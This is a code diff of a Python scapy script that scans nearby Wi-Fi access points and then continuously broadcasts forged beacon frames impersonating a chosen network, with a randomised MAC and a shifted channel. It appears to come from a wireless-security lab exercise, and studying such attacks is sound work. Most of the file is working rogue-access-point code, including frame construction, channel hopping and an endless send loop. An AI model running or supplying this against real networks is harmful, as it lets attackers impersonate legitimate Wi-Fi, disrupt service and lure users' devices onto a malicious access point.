@@ -5,24 +5,32 @@
 from scapy.all import (
     Dot11,
     Dot11Beacon,
+    # Dot11ProbeResp,
     Dot11Elt,
     RadioTap,
     sendp,
     hexdump,
+    RandMAC,
 )
 
 DEFAULT_IFACE = "wlan0mon"
-net_ssid = 'testSSID' #Network name here
 
-def beacon(net_ssid, bssid, iface=DEFAULT_IFACE, inter=0.100):
+# Adresse 1: Adresse finale qu'on veut joindre
+# Adresse 2: celui qui emet la trame
+# Adresse 3: Adresse du prochain noeud ?
+# 
+
+def beacon(net_ssid, src_mac_addr, ap_mac_addr, iface=DEFAULT_IFACE, inter=0.100, channel=None):
     dot11 = Dot11(
         type=0,                         # To indicate the frame is a management frame (type 0).
         subtype=8,                      # To indicate the management frames subtype is a beacon (type 8).
         addr1="ff:ff:ff:ff:ff:ff",      # Destination MAC address.  => We need to broadcast             
-        addr2=bssid,                    # Source MAC address of sender.                  
-        addr3=bssid,                    # MAC address of Access Point.                    
+        addr2=src_mac_addr,                    # Source MAC address of sender.                  
+        addr3=ap_mac_addr,                    # MAC address of Access Point.                    
     )
-    beacon = Dot11Beacon(cap='ESS+privacy')
+    beacon = Dot11Beacon(
+        cap='ESS+privacy'
+    )
     essid = Dot11Elt(ID='SSID',info=net_ssid, len=len(net_ssid))
     rsn = Dot11Elt(ID='RSNinfo', info=(
         '\x01\x00'              # RSN Version 1
@@ -36,16 +44,56 @@ def beacon(net_ssid, bssid, iface=DEFAULT_IFACE, inter=0.100):
     )) 
 
 
-    frame = RadioTap()/dot11/beacon/essid/rsn
+    if channel is not None:
+        new_essid = Dot11Elt(ID="DSset", info=chr(channel))
+        frame = RadioTap()/dot11/beacon/essid/new_essid/rsn
+    else:
+        frame = RadioTap()/dot11/beacon/essid/rsn
 
-    frame.show()
-    print("\nHexDump of frame:")
-    hexdump(frame)
+
+    # frame.show()
+    # print("\nHexDump of frame:")
+    # hexdump(frame)
     input("\nPress enter to start\n")
     sendp(frame, iface=iface, inter=inter, loop=1)
 
 
 # END of beacon spoofing
+# ====================================================================================================
+# START utilities definition
+
+
+def get_fake_channel(channel):
+    if channel < 0 or channel > 14:
+        return None
+    if channel <= 8:
+        return channel + 6
+    else:
+        return channel - 6
+    return None
+
+def change_channel(interface, channel):
+    os.system("iw dev %s set channel %d" %(interface, channel))
+
+def pkt2ap(pkt):
+    # if not (pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp)):
+    #     return None
+    if not pkt.haslayer(Dot11Beacon):
+        return None
+    bssid = pkt[Dot11].addr2
+    ssid = pkt[Dot11Elt].info.decode()
+    rsn = pkt[Dot11EltRSN].info
+    try:
+        dbm_signal = pkt.dBm_AntSignal
+    except:
+        dbm_signal = "N/A"
+    stats = pkt[Dot11Beacon].network_stats()
+    channel = stats.get("channel")
+    crypto = stats.get("crypto")
+
+    return AP(bssid, ssid, channel, crypto, dbm_signal, rsn)
+
+# END utilities definition
 # ====================================================================================================
 # START definition of AP dataclass
 
@@ -62,8 +110,14 @@ class AP:
         return hash(self.bssid)
     def __eq__(self, other) -> bool:
         return self.bssid == other.bssid
-    def spoof(self, iface=DEFAULT_IFACE, inter=0.100):
-        return beacon(self.ssid, self.bssid, iface=iface, inter=inter)
+    def spoof(self, iface=DEFAULT_IFACE, inter=0.100, ssid=None, bssid=None, randmac=False):
+        channel = get_fake_channel(self.channel)
+        ssid = ssid or self.ssid
+        bssid = bssid or self.bssid
+        if randmac:
+            bssid = RandMAC()
+        print("Spoofing: {} ({}) -> {}({})".format(self.ssid, self.bssid, ssid, bssid))
+        return beacon(ssid, bssid, bssid, iface=iface, inter=inter, channel=channel)
 
 # END definition of AP dataclass
 # ====================================================================================================
@@ -125,29 +179,15 @@ def ask_ap_to_spoof(ap_list):
 # ====================================================================================================
 # START of AP discovery
 
-def change_channel(interface, channel):
-    os.system("iw dev %s set channel %d" %(interface, channel))
-
-def find_app(iface=DEFAULT_IFACE, count=10, channels=None):
+def find_ap_by_count(iface=DEFAULT_IFACE, count=10, channels=None, **_):
     AP_LIST = set()
 
     # Callback function to use on each sniffed packet
     # Source: https://www.thepythoncode.com/article/building-wifi-scanner-in-python-scapy
     def callback(pkt, AP_LIST=AP_LIST):
-        if pkt.haslayer(Dot11Beacon):
-            bssid = pkt[Dot11].addr2
-            ssid = pkt[Dot11Elt].info.decode()
-            rsn = pkt[Dot11EltRSN].info
-            try:
-                dbm_signal = pkt.dBm_AntSignal
-            except:
-                dbm_signal = "N/A"
-            stats = pkt[Dot11Beacon].network_stats()
-            channel = stats.get("channel")
-            crypto = stats.get("crypto")
-
-            wifi = AP(bssid, ssid, channel, crypto, dbm_signal, rsn)
-            AP_LIST.add(wifi)
+        ap = pkt2ap(pkt)
+        if ap is not None:
+            AP_LIST.add(ap)
 
     # Sniff only as long as packet_count
     channels = channels or list(range(1, 12))
@@ -156,6 +196,24 @@ def find_app(iface=DEFAULT_IFACE, count=10, channels=None):
         sniff(iface=iface, prn = callback, count = count)
         channel = change_channel(iface, channel)
     return list(AP_LIST)
+
+def find_ap_by_timeout(iface=DEFAULT_IFACE, timeout=1, channels=None, **_):
+    AP_LIST = set()
+
+    # Sniff only as long as packet_count
+    channels = channels or list(range(1, 12))
+    for channel in channels:
+        print(f'Scanning channel {channel} for SSIDs')
+        packets = sniff(iface=iface, timeout=timeout)
+        AP_LIST.update({
+            ap for ap in (pkt2ap(p) for p in packets)
+            if ap is not None
+        })
+        channel = change_channel(iface, channel)
+    return list(AP_LIST)
+
+# find_ap = find_ap_by_count
+find_ap = find_ap_by_timeout
 
 # END of AP discovery
 # ====================================================================================================
@@ -194,25 +252,26 @@ def handle_arguments():
 
 # END of script parameters management
 # ====================================================================================================
-from scapy.all import (
-    RandMAC
-)
 
 def main():
     interface, packet_count, channels = handle_arguments()
-    AP_LIST = find_app(interface, packet_count, channels)
+    AP_LIST = find_ap(interface, packet_count, channels)
     target = ask_ap_to_spoof(AP_LIST)
-    target.spoof(interface)
+    target.spoof(interface, randmac=True)
 
 def test():
     interface, packet_count, channels = handle_arguments()
-    AP_LIST = find_app(interface, packet_count, channels)
+    AP_LIST = find_ap(interface, packet_count, channels)
     target = ask_ap_to_spoof(AP_LIST)
-    target.ssid = "test SWI"
-    target.bssid = RandMAC()
     print(target.bssid)
-    target.spoof(interface)
+    target.spoof(interface, ssid="test SWI", randmac=True)
 
 
 if __name__ == "__main__":
-    test()
+    main()
+    # beacon(
+    #     'testSSID',
+    #     '22:22:22:22:22:22',
+    #     '33:33:33:33:33:33',
+    # )
+    # test()
